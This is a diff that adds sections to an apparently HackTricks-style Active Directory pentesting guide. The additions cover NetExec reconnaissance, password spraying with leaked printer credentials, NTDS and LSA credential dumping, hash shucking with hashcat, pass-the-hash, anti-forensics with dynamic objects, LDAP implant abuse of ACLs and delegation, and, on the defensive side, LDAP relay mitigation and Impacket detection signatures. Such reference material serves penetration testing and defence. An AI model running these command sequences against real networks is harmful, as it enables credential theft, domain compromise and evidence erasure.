@@ -144,6 +144,30 @@ You might be able to **obtain** some challenge **hashes** to crack **poisoning**
 
 If you have managed to enumerate the active directory you will have **more emails and a better understanding of the network**. You might be able to to force NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)  to get access to the AD env.
 
+### NetExec workspace-driven recon & relay posture checks
+
+- Use **`nxcdb` workspaces** to keep AD recon state per engagement: `workspace create <name>` spawns per-protocol SQLite DBs under `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Switch views with `proto smb|mssql|winrm` and list gathered secrets with `creds`. Manually purge sensitive data when done: `rm -rf ~/.nxc/workspaces/<name>`.
+- Quick subnet discovery with **`netexec smb <cidr>`** surfaces **domain**, **OS build**, **SMB signing requirements**, and **Null Auth**. Members showing `(signing:False)` are **relay-prone**, while DCs often require signing.
+- Generate **hostnames in /etc/hosts** straight from NetExec output to ease targeting:
+
+```bash
+netexec smb 10.2.10.0/24 --generate-hosts-file hosts
+cat hosts /etc/hosts | sponge /etc/hosts
+```
+
+- When **SMB relay to the DC is blocked** by signing, still probe **LDAP** posture: `netexec ldap <dc>` highlights `(signing:None)` / weak channel binding. A DC with SMB signing required but LDAP signing disabled remains a viable **relay-to-LDAP** target for abuses like **SPN-less RBCD**.
+
+### Client-side printer credential leaks → bulk domain credential validation
+
+- Printer/web UIs sometimes **embed masked admin passwords in HTML**. Viewing source/devtools can reveal cleartext (e.g., `<input value="<password>">`), allowing Basic-auth access to scan/print repositories.
+- Retrieved print jobs may contain **plaintext onboarding docs** with per-user passwords. Keep pairings aligned when testing:
+
+```bash
+cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
+cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
+netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
+```
+
 ### Steal NTLM Creds
 
 If you can **access other PCs or shares** with the **null or guest user** you could **place files** (like a SCF file) that if somehow accessed will t**rigger an NTLM authentication against you** so you can **steal** the **NTLM challenge** to crack it:
@@ -152,6 +176,104 @@ If you can **access other PCs or shares** with the **null or guest user** you co
 {{#ref}}
 ../ntlm/places-to-steal-ntlm-creds.md
 {{#endref}}
+
+### Hash Shucking & NT-Candidate Attacks
+
+**Hash shucking** treats every NT hash you already possess as a candidate password for other, slower formats whose key material is derived directly from the NT hash. Instead of brute-forcing long passphrases in Kerberos RC4 tickets, NetNTLM challenges, or cached credentials, you feed the NT hashes into Hashcat’s NT-candidate modes and let it validate password reuse without ever learning the plaintext. This is especially potent after a domain compromise where you can harvest thousands of current and historical NT hashes.
+
+Use shucking when:
+
+- You have an NT corpus from DCSync, SAM/SECURITY dumps, or credential vaults and need to test for reuse in other domains/forests.
+- You capture RC4-based Kerberos material (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses, or DCC/DCC2 blobs.
+- You want to quickly prove reuse for long, uncrackable passphrases and immediately pivot via Pass-the-Hash.
+
+The technique **does not work** against encryption types whose keys are not the NT hash (e.g., Kerberos etype 17/18 AES). If a domain enforces AES-only, you must revert to the regular password modes.
+
+#### Building an NT hash corpus
+
+- **DCSync/NTDS** – Use `secretsdump.py` with history to grab the largest possible set of NT hashes (and their previous values):
+
+  ```bash
+  secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
+  grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
+  ```
+
+  History entries dramatically widen the candidate pool because Microsoft can store up to 24 previous hashes per account. For more ways to harvest NTDS secrets see:
+
+{{#ref}}
+dcsync.md
+{{#endref}}
+
+- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (or Mimikatz `lsadump::sam /patch`) extracts local SAM/SECURITY data and cached domain logons (DCC/DCC2). Deduplicate and append those hashes to the same `nt_candidates.txt` list.
+- **Track metadata** – Keep the username/domain that produced each hash (even if the wordlist contains only hex). Matching hashes tell you immediately which principal is reusing a password once Hashcat prints the winning candidate.
+- Prefer candidates from the same forest or a trusted forest; that maximizes the chance of overlap when shucking.
+
+#### Hashcat NT-candidate modes
+
+| Hash Type                                | Password Mode | NT-Candidate Mode |
+| ---------------------------------------- | ------------- | ----------------- |
+| Domain Cached Credentials (DCC)          | 1100          | 31500             |
+| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
+| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
+| NetNTLMv2                                | 5600          | 27100             |
+| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
+| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
+| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |
+
+Notes:
+
+- NT-candidate inputs **must remain raw 32-hex NT hashes**. Disable rule engines (no `-r`, no hybrid modes) because mangling corrupts the candidate key material.
+- These modes are not inherently faster, but the NTLM keyspace (~30,000 MH/s on an M3 Max) is ~100× quicker than Kerberos RC4 (~300 MH/s). Testing a curated NT list is far cheaper than exploring the entire password space in the slow format.
+- Always run the **latest Hashcat build** (`git clone https://github.com/hashcat/hashcat && make install`) because modes 31500/31600/35300/35400 shipped recently.
+- There is currently no NT mode for AS-REQ Pre-Auth, and AES etypes (19600/19700) require the plaintext password because their keys are derived via PBKDF2 from UTF-16LE passwords, not raw NT hashes.
+
+#### Example – Kerberoast RC4 (mode 35300)
+
+1. Capture an RC4 TGS for a target SPN with a low-privileged user (see the Kerberoast page for details):
+
+{{#ref}}
+kerberoast.md
+{{#endref}}
+
+   ```bash
+   GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
+   ```
+
+2. Shuck the ticket with your NT list:
+
+   ```bash
+   hashcat -m 35300 roastable_TGS nt_candidates.txt
+   ```
+
+   Hashcat derives the RC4 key from each NT candidate and validates the `$krb5tgs$23$...` blob. A match confirms that the service account uses one of your existing NT hashes.
+
+3. Immediately pivot via PtH:
+
+   ```bash
+   nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
+   ```
+
+   You can optionally recover the plaintext later with `hashcat -m 1000 <matched_hash> wordlists/` if needed.
+
+#### Example – Cached credentials (mode 31600)
+
+1. Dump cached logons from a compromised workstation:
+
+   ```bash
+   nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
+   ```
+
+2. Copy the DCC2 line for the interesting domain user into `dcc2_highpriv.txt` and shuck it:
+
+   ```bash
+   hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
+   ```
+
+3. A successful match yields the NT hash already known in your list, proving that the cached user is reusing a password. Use it directly for PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) or brute-force it in fast NTLM mode to recover the string.
+
+The exact same workflow applies to NetNTLM challenge-responses (`-m 27000/27100`) and DCC (`-m 31500`). Once a match is identified you can launch relay, SMB/WMI/WinRM PtH, or re-crack the NT hash with masks/rules offline.
+
+
 
 ## Enumerating Active Directory WITH credentials/session
 
@@ -517,6 +639,14 @@ The **security descriptors** are used to **store** the **permissions** an **obje
 security-descriptors.md
 {{#endref}}
 
+### Dynamic Objects Anti-Forensics / Evasion
+
+Abuse the `dynamicObject` auxiliary class to create short-lived principals/GPOs/DNS records with `entryTTL`/`msDS-Entry-Time-To-Die`; they self-delete without tombstones, erasing LDAP evidence while leaving orphan SIDs, broken `gPLink` references, or cached DNS responses (e.g., AdminSDHolder ACE pollution or malicious `gPCFileSysPath`/AD-integrated DNS redirects).
+
+{{#ref}}
+ad-dynamic-objects-anti-forensics.md
+{{#endref}}
+
 ### Skeleton Key
 
 Alter **LSASS** in memory to establish a **universal password**, granting access to all domain accounts.
@@ -779,6 +909,40 @@ rdp-sessions-abuse.md
 
 [**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
 
+## LDAP-based AD Abuse from On-Host Implants
+
+The [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) re-implements bloodyAD-style LDAP primitives as x64 Beacon Object Files that run entirely inside an on-host implant (e.g., Adaptix C2). Operators compile the pack with `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, load `ldap.axs`, and then call `ldap <subcommand>` from the beacon. All traffic rides the current logon security context over LDAP (389) with signing/sealing or LDAPS (636) with auto certificate trust, so no socks proxies or disk artifacts are required.
+
+### Implant-side LDAP enumeration
+
+- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers` resolve short names/OU paths into full DNs and dump the corresponding objects.
+- `get-object`, `get-attribute`, and `get-domaininfo` pull arbitrary attributes (including security descriptors) plus the forest/domain metadata from `rootDSE`.
+- `get-uac`, `get-spn`, `get-delegation`, and `get-rbcd` expose roasting candidates, delegation settings, and existing [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) descriptors directly from LDAP.
+- `get-acl` and `get-writable --detailed` parse the DACL to list trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes), and inheritance, giving immediate targets for ACL privilege escalation.
+
+```powershell
+ldap get-users --ldaps
+ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
+ldap get-writable --detailed
+ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
+```
+
+### LDAP write primitives for escalation & persistence
+
+- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) let the operator stage new principals or machine accounts wherever OU rights exist. `add-groupmember`, `set-password`, `add-attribute`, and `set-attribute` directly hijack targets once write-property rights are found.
+- ACL-focused commands such as `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, and `add-dcsync` translate WriteDACL/WriteOwner on any AD object into password resets, group membership control, or DCSync replication privileges without leaving PowerShell/ADSI artifacts. `remove-*` counterparts clean up injected ACEs.
+
+### Delegation, roasting, and Kerberos abuse
+
+- `add-spn`/`set-spn` instantly make a compromised user Kerberoastable; `add-asreproastable` (UAC toggle) marks it for AS-REP roasting without touching the password.
+- Delegation macros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) rewrite `msDS-AllowedToDelegateTo`, UAC flags, or `msDS-AllowedToActOnBehalfOfOtherIdentity` from the beacon, enabling constrained/unconstrained/RBCD attack paths and eliminating the need for remote PowerShell or RSAT.
+
+### sidHistory injection, OU relocation, and attack surface shaping
+
+- `add-sidhistory` injects privileged SIDs into a controlled principal’s SID history (see [SID-History Injection](sid-history-injection.md)), providing stealthy access inheritance fully over LDAP/LDAPS.
+- `move-object` changes the DN/OU of computers or users, letting an attacker drag assets into OUs where delegated rights already exist before abusing `set-password`, `add-groupmember`, or `add-spn`.
+- Tightly scoped removal commands (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, etc.) allow rapid rollback after the operator harvests credentials or persistence, minimizing telemetry.
+
 ## AD -> Azure & Azure -> AD
 
 
@@ -795,6 +959,35 @@ https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-move
 - **Domain Admins Restrictions**: It is recommended that Domain Admins should only be allowed to login to Domain Controllers, avoiding their use on other hosts.
 - **Service Account Privileges**: Services should not be run with Domain Admin (DA) privileges to maintain security.
 - **Temporal Privilege Limitation**: For tasks requiring DA privileges, their duration should be limited. This can be achieved by: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
+- **LDAP relay mitigation**: Audit Event IDs 2889/3074/3075 and then enforce LDAP signing plus LDAPS channel binding on DCs/clients to block LDAP MITM/relay attempts.
+
+{{#ref}}
+ldap-signing-and-channel-binding.md
+{{#endref}}
+
+### Protocol-level fingerprinting of Impacket activity
+
+If you want to detect common AD tradecraft, **do not rely only on operator-controlled artifacts** such as renamed binaries, service names, temp batch files, or output paths. Baseline how legitimate Windows clients build [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC, and WMI traffic, then look for **implementation quirks** that remain even after the operator edits `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py`, or `ntlmrelayx.py`.
+
+- **High-confidence standalone candidates** (after validating against your own baseline):
+  - Authenticated DCE/RPC using `auth_context_id = 79231 + ctx_id`
+  - DCE/RPC authentication padding filled with `0xff`
+  - LDAP Kerberos binds that place a raw Kerberos `AP-REQ` directly in SPNEGO `mechToken`
+  - SMB2/3 negotiate requests with ASCII-looking `ClientGuid` values
+  - WMI `IWbemLevel1Login::NTLMLogin` using the non-standard namespace `//./root/cimv2`
+  - Hardcoded Kerberos nonce values
+- **Better as correlation/scoring features**:
+  - Sparse or duplicated Kerberos etype lists, unusual/missing `PA-DATA`, or TGS-REQ etype ordering that differs from native Windows
+  - NTLM Type 1 messages missing version info or Type 3 messages with null host names
+  - Raw NTLMSSP carried in DCE/RPC instead of SPNEGO, missing DCE/RPC verification trailers, or SPNEGO/Kerberos OID mismatches
+  - Several of these traits from the same host/user/session/time window are far stronger than any single weak field
+- **Use as enrichment, not as standalone alerts**:
+  - Default filenames, output paths, random service names, temporary batch names, default computer account names, and tool-specific HTTP/WebDAV/RDP/MSSQL strings
+  - These are easy for operators to change and are best used to explain why a cross-protocol cluster is suspicious
+- **Operational notes**:
+  - Some of these signals require decrypted traffic, [PCAP/Zeek parsing](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW, or service-side visibility
+  - Validate against Samba/Linux clients, appliances, and legacy software before promoting to alerts
+  - Promote detections from enrichment -> hunting -> alerting as you build confidence in the baseline
 
 ### **Implementing Deception Techniques**
 
@@ -819,5 +1012,10 @@ https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-move
 - [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
 - [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
 - [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
+- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
+- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
+- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
+- [Hashcat](https://github.com/hashcat/hashcat)
+- [ThatTotallyRealMyth/Impacket-IoCs – Dissecting Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
 
 {{#include ../../banners/hacktricks-training.md}}
